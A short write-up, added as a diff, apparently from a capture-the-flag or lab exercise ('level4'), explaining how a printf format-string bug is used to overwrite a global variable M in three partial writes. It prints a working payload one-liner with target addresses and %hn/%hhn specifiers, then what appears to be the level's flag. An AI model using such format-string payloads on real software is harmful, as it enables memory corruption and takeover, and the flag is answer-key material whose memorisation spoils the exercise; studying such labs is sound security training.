@@ -1,0 +1,5 @@
+So we exploited the printf since we were free to use any formatstring. We saw there was a M global so we decided to do the same as before. But this time the number to put in M was bigger so we had to do this in 3 times, to write in the high part of the adress, and then first and second bits of it; like so :
+
+./level4 <<< `python -c 'print("\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "%246x%12\$hn" + "%66x%13\$hhn" + "%17x%14\$hhn")'`
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
